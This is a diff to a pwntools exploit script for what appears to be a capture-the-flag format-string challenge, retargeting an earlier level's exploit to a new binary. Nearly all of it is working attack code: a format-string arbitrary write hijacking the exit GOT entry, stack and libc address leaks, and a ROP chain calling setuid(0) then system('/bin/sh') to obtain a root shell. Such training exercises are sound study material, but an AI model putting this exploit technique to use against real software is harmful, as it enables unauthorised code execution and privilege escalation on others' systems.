@@ -1,13 +1,13 @@
 from pwn import * 
 
 
-binary = './babyfmt_level10.0_patched'
+binary = './babyfmt_level10.1_patched'
 libc = ELF('./libc.so.6')
 p = process(binary)
 
 s = '''
 b * printf
-b * func+449
+b * func+232
 '''
 
 def arw(target, dest, num_bytes, payload, param_pos):
@@ -17,7 +17,7 @@ def arw(target, dest, num_bytes, payload, param_pos):
 		print(hex(dest_bytes[i]))
 
 	
-	printed = len(payload) + 0x6c     
+	printed = len(payload) + 0x23     
 
 
 	for i, byte in enumerate(dest_bytes):
@@ -78,23 +78,29 @@ def fmt_payload(dest, num_bytes, payload, param_pos, printed):
 
 
 payload = b"---"
-arw(0x404068, 0x00000000004014c0, 3, payload, 50) # exit ---> func
+
+
+arw(0x404068, 0x4012bd, 3, payload, 51) # exit ---> func
 
 
 p.clean() # clean the output of the previous payload (arw), so that recvuntil("Your input...") listens to new payload
 
 
 
-payload_leak = b"%164$p\n%354$p"
+
+payload_leak = b"%174$p\n%374$p"
 p.sendline(payload_leak)
 
 
 
-p.recvuntil("Your input is:                                                                                             \n")
+p.recvuntil("Your input is: ")
 
+p.recvline()
 leak = p.recvline().strip().decode()
+
+
 old_rbp = int(leak, 16) # address in str
-rsp = old_rbp - 0xef8
+rsp = old_rbp - 0xa90 - 0x8 - 0x550
 
 print("rsp: ", hex(rsp))
 
@@ -104,7 +110,6 @@ libc_leak = int(leak, 16)
 print("libc leak: ", hex(libc_leak))
 libc_base = libc_leak - 0x229190
 print("libc base: ", hex(libc_base))
-
 
 
 '''
@@ -127,20 +132,22 @@ bin_sh_addr = libc_base + 0x1b45bd
 print("setuid :", hex(setuid))
 print("system :", hex(system))
 # gadgets
-ret = 0x000000000040101a
-pop_rdi = 0x00000000004018a3
+pop_rdi = 0x0000000000401593
+
+
+
 
 
 # writing the super long fmt_string
-payload = b"--------------"
-printed = len(payload) + 0x6c 
+payload = b"--------"
+printed = len(payload) + 0x23 
 
-payload, printed = fmt_payload(pop_rdi, 3, payload, 93, printed) # preparing pop rdi
-payload, printed = fmt_payload(0, 8, payload, 96, printed) # preparing 0
-payload, printed = fmt_payload(setuid, 6, payload, 104, printed) 
-payload, printed = fmt_payload(pop_rdi, 3, payload, 110, printed) 
-payload, printed = fmt_payload(bin_sh_addr, 6, payload, 113, printed)
-payload, printed = fmt_payload(system, 6, payload, 119, printed)
+payload, printed = fmt_payload(pop_rdi, 3, payload, 92, printed) # preparing pop rdi
+payload, printed = fmt_payload(0, 8, payload, 95, printed) # preparing 0
+payload, printed = fmt_payload(setuid, 6, payload, 103, printed) 
+payload, printed = fmt_payload(pop_rdi, 3, payload, 109, printed) 
+payload, printed = fmt_payload(bin_sh_addr, 6, payload, 112, printed)
+payload, printed = fmt_payload(system, 6, payload, 118, printed)
 
 target = rsp
 for i in range(3):
